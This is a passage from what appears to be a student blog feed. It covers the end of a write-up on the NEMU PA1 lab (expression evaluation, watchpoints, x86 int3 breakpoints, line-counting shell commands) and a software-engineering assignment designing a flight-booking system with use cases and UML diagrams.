<span class="hljs-keyword">case</span> TK_NEQ:        levels[<span class="hljs-number">5</span>] = i;        <span class="hljs-keyword">break</span>;      }    }  }</code></pre></div></div><p>一个坑是注意到讲义中提到<strong>出现在一对括号中的token不是主运算符</strong>，因此一定要确保只对括号外的运算符判断优先级即可。优先级参照C++的优先级表分成了六个等级，依次扫描即可。</p><p>接下来for循环遍历的过程自然地返回了存在的最高优先级运算符的位置。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ggsd8xlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-ggsd8xlmrh9u65"><pre><code class="hljs c++">  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)  {    <span class="hljs-keyword">if</span> (levels[i] != <span class="hljs-number">-1</span>)    {      <span class="hljs-keyword">return</span> levels[i];    }  }  <span class="hljs-comment">// if no operator found</span>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error:no operator found in get_domin_op_pos\n"</span>);  <span class="hljs-built_in">panic</span>(<span class="hljs-string">"p=%d,q=%d in get_domin_op_pos() where got no token"</span>, p, q);}</code></pre></div></div><p>当然最后需要在<code>ui.c</code>加入表达式求值的指令。</p><p>实现效果：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205845305075_505_20230322090903021377_849_image-20230321194541159.png" alt="image-20230321194541159"><figcaption aria-hidden="true">image-20230321194541159</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205846416684_863_20230322090904623223_231_image-20230321194853335.png" alt="image-20230321194853335"><figcaption aria-hidden="true">image-20230321194853335</figcaption></figure><h4 id="感想">感想</h4><p>在表达式求值的实验中确实感受到了基本调试工具和手段的重要性。首先gcc开启<code>--Wall</code>和<code>-Werror</code>能够杜绝绝大多数“手误”(第一次完整实现完表达式求值的时候错误爆满屏..)，同时不同位置的<code>assert</code>也便于查看问题出现的位置。</p><h2 id="pa1.3">PA1.3</h2><h3 id="监视点">监视点</h3><h4 id="任务-4">任务</h4><p>这一部分相比前两部分要简单很多。主要是链表的基本操作，操作系统，编译原理中也经过多次练习。主要是需要考虑清楚清楚是“头插法”还是“尾插法”。</p><p>先在nemu/include/monitor/watchpoint.h中完成对结构体的补充和函数的定义。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dhs0wvlmrh9u65"></i><span>c++</span><div class="collapse show" id="collapse-dhs0wvlmrh9u65"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">watchpoint</span>{  <span class="hljs-type">int</span> NO;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">watchpoint</span> *next;  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Add more members if necessary */</span>  <span class="hljs-type">char</span> expr[<span class="hljs-number">32</span>];  <span class="hljs-type">uint32_t</span> value;} WP;</code></pre></div></div><p>当我们需要打印断点信息的时候需要知道表达式和具体值。</p><p>添加监视点需要从free链表中取一个结点给head链表，且将表达式、节点值赋给它，最后返回该节点的编号。删除监视点是遍历head链表直到找出对应NO的结点，从head中删除，添加到free链表中。同时修改类型、表达式、值。代码参见<code>nemu/src/monitor/debug/watchpoint.c</code>，不再赘述。</p><h4 id="问题-1">问题</h4><p>下面的问题的答案都主要来自于讲义中提供的文章，这篇文章比较深入的介绍了x86int3指令的工作方式。</p><h6 id="一点也不能长">一点也不能长?</h6><p>我们知道 int3 指令不带任何操作数,操作码为 1 个字节,因此指令的长度是 1个字节.这是必须的吗?假设有 一种 x86 体系结构的变种 my-x86,除了 int3指令的长度变成了 2 个字节之外,其余指令和 x86 相同.在 my-x86中,文章中的断点机制还可以正常工作吗?为什么?</p><blockquote><p>Intel Mannual 原文中提到：</p><blockquote><p>This one byte form is valuable because it can be used to replace thefirst byte of any instruction with a breakpoint, including other onebyte instructions, without over-writing other code</p></blockquote><p>第二个问题的答案是不能。</p><p>文章中还给出了这个例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jb3xzmlmrh9u65"></i><span>assembly</span><div class="collapse show" id="collapse-jb3xzmlmrh9u65"><pre><code class="hljs assembly">   .. some code ..   jz    foo   dec   eax&gt;foo:   call  bar   .. some code ..</code></pre></div></div><p>假设我们想在dec-eax上放置一个断点。这恰好是一条单字节指令（操作码为0x48）。如果替换断点指令的长度超过1字节，将被迫覆盖下一条指令（调用）的一部分，这将使其混乱，并可能产生完全无效的内容。并且我们不确定<code>jz foo</code>会不会跳转。在不停止dec-eax的情况下，CPU将直接执行其后的无效指令。</p><p>由于1字节是x86上指令能得到的最短字节，我们保证只有我们想要中断的指令才会被更改。</p></blockquote><h6 id="随心所欲的断点">随心所欲"的断点</h6><p>在x86中由于是使用int3中断触发的断点，如果在x86架构gdb中将断点设置在指令的非首字节（中间或末尾），根据gdb的工作原理，会将目标地址的第一个字节替换为int3指令，然后触发断点后再换回去，将被跟踪进程的指令指针回滚一位。(这也就是指导书中说的“偷龙转凤”)因此，这时候回滚的位置可能并不符合预期。事实上gdb在这种情况下也会报错。</p><h6 id="nemu的前世今生">NEMU的前世今生</h6><p>NEMU是通过监视点来模拟断点的，而gdbz正如上文所示是通过创建<code>ptrace</code>进程命中操作系统的<code>int3</code>中断完成的。</p><h2 id="i386手册">I386手册</h2><h6 id="尝试通过目录定位关注的问题">尝试通过目录定位关注的问题</h6><p>假设你现在需要了解一个叫 selector 的概念,请通过 i386手册的目录确定你需要阅读手册中的哪些地方.</p><p>可以通过搜索解决问题。关于selector的详细阐述在内存管理部分，</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205847482942_898_image-20230321211615894.png" alt="image-20230321211615894"><figcaption aria-hidden="true">image-20230321211615894</figcaption></figure><p>点进去就可以看到段选择子的格式。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205849258235_907_image-20230321211811752.png" alt="image-20230321211811752"><figcaption aria-hidden="true">image-20230321211811752</figcaption></figure><h2 id="必答题">必答题</h2><p>一、</p><p>1、EFLAGS 寄存器中的 CF 位是什么意思?</p><p>CF是进位标志，在最高位发生进位或借位后将CF位置1，否则置0。</p><p>2、ModR/M 字节是什么?</p><p>ModR/M由Mod，Reg/Opcode，R/M三部分组成。Mod是前两位，用来寄存器寻址和内存寻址;Reg/Opcode是中间三位，Reg代表使用的寄存器，Opcode则是对group的Opcode进行补充;R/M为最后三位，与Mod结合起来可以得到8个寄存器和24个内存寻址。</p><p>3、mov 指令的具体格式是怎么样的? 格式是DEST ← SRC。</p><p>二、</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-smevlulmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-smevlulmrh9u65"><pre><code class="hljs shell">find . -name "*[.h/.c]" | xargs wc -l</code></pre></div></div><p>利用正则表达式，可以如下方式获取非空行代码行数</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dszqaklmrh9u65"></i><span>shell</span><div class="collapse show" id="collapse-dszqaklmrh9u65"><pre><code class="hljs shell">find . -name "*[.h/.c]" | xargs grep "^." | wc -l</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205850634028_644_20230322090905518782_851_image-20230321202840329.png" alt="image-20230321202840329"><figcaption aria-hidden="true">image-20230321202840329</figcaption></figure><p><code>git checkout</code>到原来的状态后结果如下：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205851869518_327_20230322090906611356_503_image-20230321204938932.png" alt="image-20230321204938932"><figcaption aria-hidden="true">image-20230321204938932</figcaption></figure><p>可以看到这次PA总共写了523行代码。</p><p>三、</p><p>-Wall打开所有警告，使用GCC进行编译后产生尽可能多的警告信息，取消编译操作，打印编译时所有错误或警告信息。</p><p>-Werror 要求GCC将所有的警告当成错误进行处理，取消编译操作。</p><p>使用-Wall和-Werror就是为了找出所有存在的警告，从而尽可能地避免程序运行出错。</p><p>这次实验的很多错误的发现都有这个的帮助。不过有时候gcc的检查也会显得过于严格。比如下面<code>eval</code>函数虽然已经包含了所有分支的处理，但最后还是要求我们return一个值。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA1/20230828205853446704_485_20230322090907728645_363_image-20230321205535450.png" alt="image-20230321205535450"><figcaption aria-hidden="true">image-20230321205535450</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件工程-软件设计作业</title>
    <link href="/posts/48981/"/>
    <url>/posts/48981/</url>
    
    <content type="html"><![CDATA[<h1 id="机票预订系统软件设计">机票预订系统软件设计</h1><p>2013599 田佳业</p><h2 id="系统概述">系统概述</h2><p>参考现实中机票预订系统的设计，结合实际本系统设计与题目所述有所优化：将付款放在预订机票环节而非取票环节，因为若预订机票后再付款，容易导致恶意抢占预订名额的现象，而付款后再占据预订名额能够增加成本，尽可能的避免这种情况发生。</p><h2 id="用例图">用例图</h2><p>下面通过用例图从总体上描述描述机票预订系统的功能性需求。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210425289726_730_20230409235255868737_526_image-20230408230603393.png" alt="image-20230408230603393"> | <font color="green">登录</font> | |------------------------------- | | <strong>用例ID：</strong> 1 | |<strong>参与者：</strong> 旅客，工作人员 | | <strong>简要说明：</strong>用户登录航班预订系统 | | <strong>前置条件：</strong> 无 | |<strong>基本事件流：</strong><br>1.用户进入主界面点击“登录/注册”按钮<br>2.进入登录界面，用户填写登录信息(用户名，手机号，密码)<br>3.系统校验登录信息成功，用户登录成功| |<strong>其他事件流：</strong><br>1.用户进入主界面点击“登录/注册”按钮，跳转至登录界面<br>2.进入登录界面，用户填写登录信息(用户名，手机号，密码)<br>3.系统未检索到该手机号，提示用户进行注册，进入注册页面| |<strong>异常事件流：</strong><br>1.用户信息填写格式不正确-&gt;前端校验，给予提示<br>2.用户名或密码与手机号不匹配，提示用户重新进行输入<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面| | <strong>后置条件：</strong>登录成功，返回首页供用户选择其他操作 | |注释：实际生活中手机号唯一，往往登录和注册的功能进行合并，可减小用户操作成本。|</p><table><thead><tr class="header"><th><font color="green">注册</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 2</td></tr><tr class="even"><td><strong>参与者：</strong> 未注册旅客，未注册工作人员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 未注册用户进入注册页面进行注册</td></tr><tr class="even"><td><strong>前置条件：</strong> 用户手机号未注册</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户由登录界面跳转至注册界面<br>2.出现注册页面，默认用户名为登录时输入用户名，手机号为登录时输入手机号。用户完善个人信息。<br>3.系统发送手机验证码，用户填写验证码，校验正确后完成注册</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户信息填写格式不正确-&gt;前端校验，给予提示<br>2.用户手机号已被注册-&gt;提示进入登录页面<br>3.用户验证码不正确-&gt;提示用户重新填写<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件：</strong>注册成功，系统添加完成用户信息，登录当前新注册账号</td></tr><tr class="odd"><td>注释：从登录部分拓展</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">查询航班信息</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 3</td></tr><tr class="even"><td><strong>参与者：</strong> 旅客，工作人员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 用户进入航班查询页面进行航班查询</td></tr><tr class="even"><td><strong>前置条件：</strong> 无</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击搜索框搜索航班<br>2.系统获取用户查询条件，执行查询，并进入新的页面展示查询结果</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>1..用户点击查看当前航班页面<br>2。系统获取24小时内起飞的所有航班信息，进入新的页面展示查询结果</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.未输入查询条件-&gt;前端提示用户输入查询条件<br>2.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：无</td></tr><tr class="odd"><td>注释：航班信息管理包含查询航班信息，且查询航班信息不需要用户登录</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">预订机票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 4</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客进行机票预订</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录并选择了希望预订的航班</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击座位充裕的航班<br>2.选择座位等次和位置，提交预订机票请求<br>3.预订机票成功，提示用户进行付款<br>4.用户支付机票金额，系统生成取票凭据及账单，并提示用户及时查看已订机票信息并打印取票凭据。</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户选择航班时未登录-&gt;跳转至登录页面提示用户登录或注册<br>2.提交请求时由于优先级低，被其他旅客预订-&gt;提示机票已被预订，让旅客重新选择<br>3.预订机票后15分钟内未付款-&gt;系统收回用户预订机票<br>4.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户拥有在线机票，该航班信息更新</td></tr><tr class="odd"><td>注释：系统并不强制旅客必须在预订机票后查询已订机票，尽管系统建议旅客时查看已订机票信息并打印取票凭据。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">查询已订机票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 5</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客进行已订机票的查看</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户点击“我”-&gt;已订机票<br>2.系统根据用户ID查询该用户已订购机票，并返回机票信息</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户得知已订购机票，在该页面进行后续操作，如获取取票凭据，退票等</td></tr><tr class="odd"><td>注释：系统并不强制旅客必须在预订机票后查询已订机票，尽管系统建议旅客时查看已订机票信息并打印取票凭据。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">退票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 6</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客在查询页面选择进行退票</td></tr><tr class="even"><td><strong>前置条件：</strong> 已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户在查询已订机票页面点击退票<br>2.系统提示用户确认后，取消用户航班。</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>1.若用户已取票，更新票据状态为无效<br>2.若用户已付款，退回已付金额</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户已订机票信息和航班信息更新，该用户航班取消。</td></tr><tr class="odd"><td>注释：无</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">获取取票凭据</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 7</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客保存或打印取票凭据</td></tr><tr class="even"><td><strong>前置条件：</strong> 已预订成功机票</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1用户保存取票凭据页面选择保存电子版凭据或打印纸质版凭据<br>2.系统生成凭据二维码或打印取票通知</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面<br>2.无法打印-&gt;提示用户保存电子版凭据或等待</td></tr><tr class="even"><td><strong>后置条件</strong>：用户获得取票凭据</td></tr><tr class="odd"><td>注释：获取取票凭据为起飞前取票做准备</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">取票</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 8</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客凭取票凭据取票</td></tr><tr class="even"><td><strong>前置条件：</strong> 旅客已获得取票凭据</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户输入个人信息(如手机号和验证码)，系统进行身份校验<br>2.系统读取用户电子版或纸质凭据，并进行校验<br>3.校验通过，打印票据给旅客</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.系统校验失败(如身份校验不通过，用户票据无效等)-&gt;根据情况提示用户错误信息<br>2.无法打印-&gt;提示用户等待，并向管理员报告错误<br>3.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户获得机票，准备乘机</td></tr><tr class="odd"><td>注释：即使取票依赖取票凭据，但取票并不与获取取票凭据有包含或拓展的关系，因为取票并不是获取取票凭据的特殊化，因此不是拓展关系；并不是取票时必须调用获取凭据操作，因此不是包含关系。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">个人信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 9</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册旅客，已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong> 旅客和管理员个人信息管理</td></tr><tr class="even"><td><strong>前置条件：</strong> 旅客或管理员已注册</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.用户点击个人信息管理按钮，系统校验用户名和密码以及验证码<br>2.修改个人信息，并进行保存</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>1.系统校验失败(如身份校验不通过，用户票据无效等)-&gt;根据情况提示用户错误信息<br>2.用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：用户个人信息发生改变</td></tr><tr class="odd"><td>注释：无</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">航班信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 10</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员进行航班信息的管理，如增加航班，修改航班信息等</td></tr><tr class="even"><td>**前置条件：管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>管理员进入航班信息管理页面，进行航班信息的操作，如增加航班，修改航班信息等</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：航班信息被修改</td></tr><tr class="odd"><td>注释：航班信息管理包含查询航班信息，因为管理航班信息必定要先查看。同时在用例图中不分解出CURD操作，会造成冗余</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">账单管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 11</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员对账单进行手动管理，如调整旅客已订航班等</td></tr><tr class="even"><td><strong>前置条件</strong>：管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.管理员输入旅客ID(可通过旅客信息管理获取)，查看旅客账单信息<br>2.视情况对该旅客的账单进行调整</td></tr><tr class="even"><td><strong>其他事件流：</strong><br>管理员根据筛选条件对符合条件的账单进行批量调整</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：管理员查看到账单信息，可能对其有修改</td></tr><tr class="odd"><td>注释：该功能主要针对系统出现异常或应对航班出现的特殊情况，增加手动管理旅客账单的功能。</td></tr></tbody></table><table><thead><tr class="header"><th><font color="green">旅客信息管理</font></th></tr></thead><tbody><tr class="odd"><td><strong>用例ID：</strong> 12</td></tr><tr class="even"><td><strong>参与者：</strong> 已注册管理员</td></tr><tr class="odd"><td><strong>简要说明：</strong>管理员进行旅客个人信息的查看，修改等</td></tr><tr class="even"><td><strong>前置条件：</strong> 管理员已登录</td></tr><tr class="odd"><td><strong>基本事件流：</strong><br>1.管理员根据筛选条件(如旅客姓名，航班信息等)，查询旅客信息<br>2.视情况对旅客信息进行调整</td></tr><tr class="even"><td><strong>其他事件流：</strong>无</td></tr><tr class="odd"><td><strong>异常事件流：</strong><br>用户或服务器网络异常/服务器内部数据错误-&gt;根据状态码跳转对应页面</td></tr><tr class="even"><td><strong>后置条件</strong>：管理员查看到旅客信息，可能对其有修改</td></tr><tr class="odd"><td>注释：针对旅客个人信息的管理模块，该部分不应包含旅客账单相关内容</td></tr></tbody></table><h2 id="活动图">活动图</h2><p>活动图中的每个圆角矩形中为动作状态，描述原子性的行为。登录和注册部分的用例较为复杂，在这里用活动图来较为详细的描述登录和注册的流程。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210426308912_650_20230409235259075956_784_image-20230409202727243.png" alt="image-20230409202727243" width="150%" height="150%"></p><p>用户未登录或注册完成时，随时可以点击取消结束该用例流程。用户进入登录页面，输入用户名，手机号，密码。系统会查找该用户的手机号是否已完成注册。若用户未注册，系统会自动为用户进行注册，提示用户输入个人信息，通过验证码验证手机号可用后即可完成注册。由于注册时用户有可能改变手机号信息，因此注册阶段也需要验证手机号。确定用户使用手机号注册后系统生成手机验证码，并提示用户输入。用户正确输入验证码后系统接受注册信息，存储新用户信息并自动登录，前端通知用户并结束用例流程，供用户选择后续操作。</p><h2 id="类图">类图</h2><p>类图是系统的概念基础。下面将整个订票系统涉及的实体和控制类通过类图描述。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210427690596_694_20230409235301223716_963_image-20230409231700319.png" alt="image-20230409231700319" width="150%" height="150%"></p><p>类图部分事实上是在整个设计过程中考虑和修改次数最多的部分。</p><p>由于管理员课执行操作较多，不同管理员除了权限等级差距外执行的具体操作并无差距，我们可以将管理员可以执行的操作提取为静态的方法类。实体类及其方法均需与用例描述对应。</p><p>考虑到类图整体的简洁，图中省略了方法参数。</p><h2 id="顺序图">顺序图</h2><p>顺序图能够体现类与类之间的交互关系。最重要的是，顺序图能够实现某个功能的必要步骤。因此下面分别在细粒度和粗粒度上给出个人信息管理和旅客乘机全过程的顺序图。</p><p>前面已经给出了注册登录部分的活动图，在下面的图示中默认提及到的用户均已登录。</p><h3 id="个人信息管理">个人信息管理</h3><p>下面展示了用户个人信息管理的顺序图。</p><p>用户可查看个人信息，修改个人信息是可选的。同时用户选择结束个人信息管理时前端页面关闭，处理该事务的DAO关闭，数据库需要持续运行。这个过程中所有的消息都是同步消息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210430070649_951_20230409235303100664_328_image-20230409203220770.png" alt="image-20230409203220770"><figcaption aria-hidden="true">image-20230409203220770</figcaption></figure><blockquote><p>→查询个人信息请求(用户→系统前端)</p><p>→提交查询请求(系统前端→DAO)</p><p>→根据用户ID查询用户信息(DAO→DB)</p><p>→返回用户信息(DB→DAO)</p><p>→传送用户信息(DAO→系统前端)</p><p>→展示用户信息(系统前端→用户）</p><p>→选择需修改的信息(用户→系统前端）</p><p>→判断修改的信息，提交修改请求(系统前端→DAO)</p><p>→执行修改信息计划(DAO→DB)</p><p>→返回执行状态(DB→DAO)</p><p>→ 判断是否修改成功，传送修改状态(DAO→系统前端)</p><p>→展示修改状态(系统前端→用户）</p><p>→结束个人信息管理(用户→系统前端)</p><p>→销毁当前DAO(系统前端→DAO)</p></blockquote><h3 id="旅客乘机全过程">旅客乘机全过程</h3><p>旅客乘机包含查询航班信息，预订机票，查看已订机票，获取取票凭据，取票几个阶段。为清晰的表示各阶段之间的关系，不再表示出具体前后端交互的过程，转而强调各个类之间的关系。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210431213370_167_20230409235304935117_188_image-20230409214542211.png" alt="image-20230409214542211" width="150%" height="150%"></p><blockquote><p>查询航班信息(旅客→Flights类）</p><p>→返回航班信息(ight类&gt;旅客)</p><p>→ 订票请求(旅客→Bi类）</p><p>→根据用户所选FlightlD获取用户所选机票价格(Bill类→Flight类)</p><p>→ 返回航班价格(Flight类→Bill类)</p><p>→生成账单(Bill类→Bill类)</p><p>→ 要求用户付款(Bill类&gt;旅客)</p><p>→[15分钟内]付款(旅客→Bill类）</p><p>→[opt]销毁账单(Bill类→Bill类)</p><p>→返回预订成功信息(Bl类→旅客)</p><p>→ 获取取票凭据(旅客→CredentialGenerator类）</p><p>→ 根据用户所选航班获取账单(CredentialGeneratora类→Bill类)</p><p>→ 返回账单ID(Bill类→CredentialGenerator类)</p><p>→要求用户选择凭据类型(CredentialGenerator类→旅客)</p><p>→用户选择凭据类型(旅客→CredentialGenerator类）</p><p>→ 生成凭据(CredentialGenerator类→CredentialGenerator类)</p><p>→返回凭据给用户(CredentialGenerator类→旅客)</p><p>→取票(旅客→TicketGenerator类）</p><p>→ 获取账单信息(TicketGenerator类→Bill类)</p><p>→获取航班信息(TicketGenerator类→Flight类)</p><p>→等待账单信息和航班信息准备好(TicketGenerator类→TicketGenerator类</p><p>→返回账单信息(Bil类→TicketGenerator类)</p><p>→返回航班信息(Flight类→TicketGenerator类)</p><p>→生成票据(TicketGenerator类→TicketGenerator类)</p><p>→打印票据(TicketGenerator类→TicketGenerator类)</p><p>→返回机票给旅客(TicketGenerator类→旅客)</p></blockquote><p>这个顺序图展示了旅客乘机所需要经历的完整流程，比较复杂。其中需要着重注意的过程是用户预定后生成的账单是未付款的状态，需要提醒用户进行付款。15分钟未付款账单被销毁。同时，产生机票的过程中需要同时获取账单信息和航班信息，这个过程是无依赖的，因此可以采用异步的方式并行执行。但取票机需要两个信息都获取后才能打印机票，因此需要等待。</p><h2 id="协作图">协作图</h2><p>协作图相比顺序图，更强调类与类之间在空间上的交互。事实上，协作图和顺序图是等价的，可以相互转化。</p><p>下面给出用户退票用例的协作图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210432463999_484_20230409235306483524_888_image-20230409222120459.png" alt="image-20230409222120459"><figcaption 